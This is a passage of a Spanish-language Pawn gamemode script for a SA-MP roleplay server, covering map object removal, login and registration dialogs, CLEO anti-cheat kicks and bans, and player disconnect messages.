	RemoveBuildingForPlayer(playerid, 2811, 2372.7031, -1128.9141, 1049.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 15061, 2371.6094, -1128.1875, 1051.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 15062, 2371.6094, -1128.1875, 1051.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2868, 2370.1250, -1125.2344, 1049.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 1703, 2370.3906, -1124.4375, 1049.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 1822, 2372.0938, -1124.2188, 1049.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 2828, 2374.2578, -1129.2578, 1050.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 2084, 2374.4688, -1129.2109, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 1703, 2374.6797, -1122.5313, 1049.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 2281, 2375.6641, -1128.1016, 1051.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 2868, 2374.9766, -1125.2344, 1049.8672, 0.25);
	RemoveBuildingForPlayer(playerid, 2280, 2375.6484, -1122.3828, 1051.9922, 0.25);
	RemoveBuildingForPlayer(playerid, 15035, 2205.9375, -1073.9922, 1049.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 2259, 2316.3125, -1024.5156, 1051.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 2242, 2321.4609, -1019.7500, 1049.3672, 0.25);
	RemoveBuildingForPlayer(playerid, 2078, 2318.2578, -1017.6016, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2203, 2312.1641, -1014.5547, 1050.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2312.3750, -1014.5547, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2830, 2312.1406, -1013.6719, 1050.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2312.3750, -1013.5625, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2241, 2322.4453, -1026.4453, 1050.5000, 0.25);
	RemoveBuildingForPlayer(playerid, 2244, 2322.3594, -1019.8906, 1049.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 2112, 2322.6563, -1026.4219, 1049.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 2105, 2323.0156, -1026.8594, 1050.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 2224, 2322.6953, -1019.0859, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2261, 2322.4609, -1015.4297, 1051.1563, 0.25);
	RemoveBuildingForPlayer(playerid, 2165, 2323.3750, -1015.8984, 1053.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1714, 2323.7500, -1014.8594, 1053.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 1755, 2325.2734, -1025.0625, 1049.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 2229, 2325.6406, -1017.2813, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2107, 2326.0703, -1016.6719, 1050.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2325.5313, -1015.0938, 1053.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 15060, 2326.6641, -1022.1953, 1049.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 2104, 2327.1719, -1017.2109, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2088, 2327.4766, -1015.0938, 1053.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2312.3750, -1012.5703, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2303, 2312.3594, -1011.5859, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2313.8906, -1011.5781, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2314.9844, -1012.6797, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2115, 2314.9922, -1011.4063, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2832, 2315.0547, -1011.2813, 1050.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2315.9297, -1011.5859, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2831, 2312.1875, -1010.6563, 1050.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 2136, 2312.3594, -1010.6094, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2313.8906, -1010.5391, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2315.9297, -1010.5469, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2317.3438, -1009.5938, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2079, 2314.9844, -1009.2969, 1049.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1822, 2324.3359, -1012.2188, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2333, 2323.4922, -1009.7266, 1053.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2323.7891, -1009.5938, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2324.7813, -1009.5938, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2331, 2323.4453, -1009.2813, 1053.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 2298, 2325.0625, -1010.7188, 1053.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2325.7813, -1009.5938, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1822, 2326.6250, -1012.2188, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2326.7734, -1009.5938, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2312.3672, -1008.6094, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2138, 2314.3281, -1007.6328, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2305, 2312.3672, -1007.6250, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2135, 2313.3359, -1007.6250, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2317.3438, -1008.6016, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1735, 2318.8047, -1007.9688, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2139, 2317.3438, -1007.6094, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2194, 2322.3594, -1008.4453, 1054.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2325.0391, -1006.9453, 1054.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 2528, 2321.2656, -1006.0313, 1053.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 2249, 2323.0156, -1005.8828, 1054.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 2526, 2318.3750, -1003.0703, 1053.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 2523, 2322.2500, -1003.0703, 1053.7188, 0.25);
	RemoveBuildingForPlayer(playerid, 2227, 2370.2344, -1120.5859, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 1742, 2366.6953, -1119.2500, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 1703, 2371.6016, -1121.5078, 1049.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 2227, 2375.5859, -1120.9922, 1049.8750, 0.25);
	RemoveBuildingForPlayer(playerid, 1760, 2327.8047, -1021.0313, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 2295, 2328.7891, -1015.8281, 1049.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 1739, 2328.8359, -1023.6016, 1050.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1739, 2329.0469, -1022.6953, 1050.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 2229, 2329.0703, -1017.2813, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 2295, 2329.2578, -1015.8281, 1053.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2327.7578, -1009.5938, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2106, 2327.7266, -1006.9453, 1054.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2329.1875, -1011.0078, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2329.1875, -1011.9922, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2291, 2329.1875, -1010.0234, 1049.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2285, 2328.9766, -1007.6406, 1051.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 2869, 2329.2891, -1025.8672, 1049.2266, 0.25);
	RemoveBuildingForPlayer(playerid, 2829, 2329.4688, -1023.6250, 1050.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 2868, 2329.7656, -1023.0156, 1050.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 2117, 2329.6953, -1022.5859, 1049.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1739, 2330.3672, -1023.5156, 1050.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1739, 2330.3672, -1022.6875, 1050.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 2243, 2329.2969, -1018.0313, 1049.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 2096, 2330.2266, -1012.9688, 1053.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 2240, 2330.7422, -1010.7813, 1054.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 2096, 2330.2266, -1009.1875, 1053.7109, 0.25);

	//		PAYNSPRAY       //
	RemoveBuildingForPlayer(playerid, 5422, 2071.4766, -1831.4219, 14.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 5856, 1024.9844, -1029.3516, 33.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 5779, 1041.3516, -1025.9297, 32.6719, 0.25);

	//      MOTOCROSS       //
	RemoveBuildingForPlayer(playerid, 13592, -1405.2031, 1645.5234, 1061.2422, 0.25);

	//      ENTREGAS        //
	RemoveBuildingForPlayer(playerid, 762, 980.8047, -2186.8984, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1000.1328, -2132.2656, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1015.9531, -2078.9766, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1023.5938, -2050.6875, 16.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 762, 1011.8594, -2043.5000, 16.0859, 0.25);

	//		CARTEL LSPD       //
	RemoveBuildingForPlayer(playerid, 1266, 1538.5234, -1609.8047, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 4229, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 4230, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 1538.5234, -1609.8047, 19.8438, 0.25);

	//		CAMIONEROS       //
	RemoveBuildingForPlayer(playerid, 3244, 2632.3906, -2136.3281, 12.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, 2632.3906, -2136.3281, 12.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3779, 2631.9141, -2098.5781, 20.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 3779, 2653.9375, -2092.3359, 20.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 3637, 2631.9141, -2098.5781, 20.0078, 0.25);
	RemoveBuildingForPlayer(playerid, 3637, 2653.9375, -2092.3359, 20.0078, 0.25);

	//		CARCEL (Nathan - Ur1.-)       //
	RemoveBuildingForPlayer(playerid, 14437, 2526.9844, -1316.3047, 1032.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 1440, 2538.2969, -1299.1875, 1030.9453, 0.25);
	RemoveBuildingForPlayer(playerid, 1441, 2544.0000, -1300.6875, 1031.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 1464, 2545.3281, -1300.6797, 1031.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2567.3984, -1299.1484, 1030.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2571.3359, -1300.3984, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2571.3516, -1303.4063, 1043.1172, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8516, -1307.1563, 1036.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2577.8359, -1304.1484, 1036.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2553.0313, -1297.4141, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2552.1875, -1297.2500, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2539.3516, -1296.3828, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2551.5000, -1296.4922, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2571.5469, -1295.9531, 1030.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2529.2500, -1295.4063, 1030.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2539.3516, -1294.6094, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2537.8203, -1295.5000, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2538.5078, -1295.2422, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2553.0313, -1295.6406, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 14438, 2547.4688, -1293.9375, 1040.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2533.1172, -1293.2578, 1030.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 1499, 2529.2344, -1292.3984, 1030.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 2607, 2527.9688, -1290.9219, 1030.8203, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2533.1172, -1290.2500, 1031.3047, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2544.7422, -1291.9688, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1431, 2545.4297, -1292.3750, 1030.9766, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2546.2734, -1292.4766, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 1421, 2546.2734, -1290.7031, 1031.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 14433, 2547.4844, -1293.6484, 1038.5391, 0.25);
	RemoveBuildingForPlayer(playerid, 14440, 2547.4219, -1289.7422, 1048.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 14442, 2547.4844, -1293.6484, 1030.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2567.3672, -1291.9063, 1030.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 925, 2572.1953, -1292.4297, 1031.4844, 0.25);
	RemoveBuildingForPlayer(playerid, 14432, 2538.5781, -1287.1406, 1033.0000, 0.25);
	RemoveBuildingForPlayer(playerid, 1450, 2538.1172, -1287.5313, 1031.0156, 0.25);
	RemoveBuildingForPlayer(playerid, 14464, 2545.5469, -1281.8672, 1039.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 14413, 2555.4844, -1287.1563, 1036.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 14436, 2557.5000, -1285.8984, 1041.9609, 0.25);
	RemoveBuildingForPlayer(playerid, 931, 2566.7891, -1286.9375, 1031.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 931, 2566.7891, -1284.5078, 1031.4766, 0.25);
	RemoveBuildingForPlayer(playerid, 923, 2567.3906, -1281.5156, 1031.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2568.2734, -1280.5000, 1031.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 944, 2571.5313, -1288.6875, 1030.7891, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2572.3203, -1281.5313, 1031.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 922, 2573.0313, -1280.5000, 1031.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 931, 2576.7109, -1281.1797, 1031.4766, 0.25);

	//		AYUNTAMIENTO       //
    RemoveBuildingForPlayer(playerid, 4024, 1479.8672, -1790.3984, 56.0234, 0.25);
    RemoveBuildingForPlayer(playerid, 4044, 1481.1875, -1785.0703, 22.3828, 0.25);
    RemoveBuildingForPlayer(playerid, 4057, 1479.5547, -1693.1406, 19.5781, 0.25);
    RemoveBuildingForPlayer(playerid, 1527, 1448.2344, -1755.8984, 14.5234, 0.25);
    RemoveBuildingForPlayer(playerid, 4210, 1479.5625, -1631.4531, 12.0781, 0.25);
    RemoveBuildingForPlayer(playerid, 713, 1457.9375, -1620.6953, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 713, 1496.8672, -1707.8203, 13.4063, 0.25);
    RemoveBuildingForPlayer(playerid, 1283, 1430.1719, -1719.4688, 15.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1451.6250, -1727.6719, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 4002, 1479.8672, -1790.3984, 56.0234, 0.25);
    RemoveBuildingForPlayer(playerid, 3980, 1481.1875, -1785.0703, 22.3828, 0.25);
    RemoveBuildingForPlayer(playerid, 4003, 1481.0781, -1747.0313, 33.5234, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1467.9844, -1727.6719, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1485.1719, -1727.6719, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1713.5078, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1716.7031, 15.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1505.1797, -1727.6719, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1713.7031, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1289, 1504.7500, -1711.8828, 13.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1704.7656, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1702.3594, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1676.6875, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1692.2344, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1656.2500, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1636.2344, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1445.8125, -1650.0234, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1433.7109, -1619.0547, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1283, 1443.2031, -1592.9453, 15.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 673, 1457.7266, -1710.0625, 12.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1461.6563, -1707.6875, 11.8359, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1704.6406, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1701.5703, 13.7266, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1702.5313, 15.6250, 0.25);
    RemoveBuildingForPlayer(playerid, 673, 1457.5547, -1697.2891, 12.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1694.0469, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1692.3906, 15.6328, 0.25);
    RemoveBuildingForPlayer(playerid, 4186, 1479.5547, -1693.1406, 19.5781, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1461.1250, -1687.5625, 11.8359, 0.25);
    RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1690.6484, 13.7266, 0.25);
    RemoveBuildingForPlayer(playerid, 641, 1458.6172, -1684.1328, 11.1016, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1457.2734, -1666.2969, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1682.7188, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1471.4063, -1666.1797, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1458.2578, -1659.2578, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1449.8516, -1655.9375, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1477.9375, -1652.7266, 15.6328, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1479.6094, -1653.2500, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1457.3516, -1650.5703, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1454.4219, -1642.4922, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1467.8516, -1646.5938, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1472.8984, -1651.5078, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1465.9375, -1639.8203, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1231, 1466.4688, -1637.9609, 15.6328, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1449.5938, -1635.0469, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1467.7109, -1632.8906, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1232, 1465.8906, -1629.9766, 15.5313, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1472.6641, -1627.8828, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1479.4688, -1626.0234, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 3985, 1479.5625, -1631.4531, 12.0781, 0.25);
    RemoveBuildingForPlayer(playerid, 4206, 1479.5547, -1639.6094, 13.6484, 0.25);
    RemoveBuildingForPlayer(playerid, 1232, 1465.8359, -1608.3750, 15.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1229, 1466.4844, -1598.0938, 14.1094, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1451.3359, -1596.7031, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1471.3516, -1596.7031, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1704.5938, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 700, 1494.2109, -1694.4375, 13.7266, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1693.7344, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1496.9766, -1686.8516, 11.8359, 0.25);
    RemoveBuildingForPlayer(playerid, 641, 1494.1406, -1689.2344, 11.1016, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1682.6719, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1480.6094, -1666.1797, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1488.2266, -1666.1797, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1486.4063, -1651.3906, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1491.3672, -1646.3828, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1493.1328, -1639.4531, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1486.1797, -1627.7656, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1280, 1491.2188, -1632.6797, 13.4531, 0.25);
    RemoveBuildingForPlayer(playerid, 1232, 1494.4141, -1629.9766, 15.5313, 0.25);
    RemoveBuildingForPlayer(playerid, 1232, 1494.3594, -1608.3750, 15.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1488.5313, -1596.7031, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1229, 1498.0547, -1598.0938, 14.1094, 0.25);
    RemoveBuildingForPlayer(playerid, 1288, 1504.7500, -1705.4063, 13.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 1287, 1504.7500, -1704.4688, 13.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 1286, 1504.7500, -1695.0547, 13.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 1285, 1504.7500, -1694.0391, 13.5938, 0.25);
    RemoveBuildingForPlayer(playerid, 673, 1498.9609, -1684.6094, 12.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1504.1641, -1662.0156, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1504.7188, -1670.9219, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1503.1875, -1621.1250, 11.8359, 0.25);
    RemoveBuildingForPlayer(playerid, 673, 1501.2813, -1624.5781, 12.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 673, 1498.3594, -1616.9688, 12.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1504.8906, -1596.7031, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 712, 1508.4453, -1668.7422, 22.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1505.6953, -1654.8359, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1508.5156, -1647.8594, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 625, 1513.2734, -1642.4922, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1258, 1510.8906, -1607.3125, 13.6953, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1721.6328, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1705.2734, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1229, 1524.2188, -1693.9688, 14.1094, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1688.0859, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1229, 1524.2188, -1673.7109, 14.1094, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1668.0781, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1647.6406, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1621.9609, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1226, 1525.3828, -1611.1563, 16.4219, 0.25);
    RemoveBuildingForPlayer(playerid, 1283, 1528.9531, -1605.8594, 15.6250, 0.25);
	return 1;
}

public OnPlayerRequestClass(playerid,classid)
{
	if (IsPlayerNPC(playerid)) return SpawnPlayer(playerid);
	if (GetPVarInt(playerid, "Logueado"))
	{
	    Kick(playerid);
	    return 1;
	}
	
	SetSpawnInfo(playerid, 0, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    LimpiarPantalla(playerid,10);

	CamaraAleatoria(playerid);

	if (fexist(U_Usuario(playerid)))
	{
		INI_ParseFile(U_Usuario(playerid), "Cargar_data", .bExtra = true, .extra = playerid);

		ShowPlayerDialog(playerid, dIngreso, DIALOG_STYLE_PASSWORD, INFO_HEADER,INFO_INGRESO, "Entrar", "Cancelar");
	}
	else
	{
		SetSpawnInfo(playerid, 0, 60, -1902.3170, 16.8255, 1061.1436, 180.0, 0, 0, 0, 0, 0, 0);

		ShowPlayerDialog(playerid, dRegistro, DIALOG_STYLE_PASSWORD,INFO_HEADER, INFO_REGISTRO, "Crear", "Cancelar");
	}
	return 1;
}

#if ACTIVAR_SEGURIDAD == true

	public OnPlayerCleoDetected(playerid, cleoid)
	{
		switch(cleoid)
		{
			case CLEO_CARWARP:
			{
				antic_Kick(playerid,"Hacer volar vehículos");
				Kick(playerid);
			}
			case CLEO_CARSWING:
			{
				antic_Kick(playerid,"Cheat de autos");
				Kick(playerid);
			}
			case CLEO_CAR_PARTICLE_SPAM:
			{
				antic_Ban(playerid,"Cleo detectado");
				BanEx(playerid, "Cleo prohibido detectado");
			}
			case CLEO_FAKEKILL:
			{
				antic_Kick(playerid,"Fake kill");
				Kick(playerid);
			}
			case CLEO_CAR_TELEPORT:
			{
				antic_Kick(playerid,"Car Teleport");
				Kick(playerid);
			}
		}
		return 1;
	}

#endif

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(GetPVarInt(playerid,"USANDO_MASCARA") || IsPlayerNPC(playerid))
	{
	    if(!InfoJugador[forplayerid][jAdmin])
			ShowPlayerNameTagForPlayer(forplayerid, playerid, false);
	}
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(playerid == INVALID_PLAYER_ID)
	    return 0;

	new string[110];
	switch(reason)
	{
 		case 0:
		{
		 	format(string, sizeof string, "El jugador "#CVERDE"%s(%d) "#CBLANCO" se desconectó por crash o Timed-out.",NombreJugador_(playerid), playerid);
			if(InfoJugador[playerid][jAdmin])
			{
				LogAdmin(playerid, "se desconectó (Crash/timed out)");
			}
		}
 		case 1:
		{
		 	format(string, sizeof string, "El jugador "#CVERDE"%s(%d) "#CBLANCO" se desconectó voluntariamente",NombreJugador_(playerid), playerid);
			if(InfoJugador[playerid][jAdmin])
			{
				LogAdmin(playerid, "se desconectó (Voluntariamente)");
			}
		}
 		case 2:
 		{
		 	format(string, sizeof string, "El jugador "#CVERDE"%s(%d) "#CBLANCO" se desconectó (Fue kickeado o baneado)",NombreJugador_(playerid), playerid);
			if(InfoJugador[playerid][jAdmin])
			{
				LogAdmin(playerid, "se desconectó (Kickeado/Baneado)");
			}
		}
	}
	ProxDetector(20.0,playerid,string,-1,-1,-1,-1,-1);

 	if(GetPVarInt(playerid,"LIC_Segundos"))
 	{
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
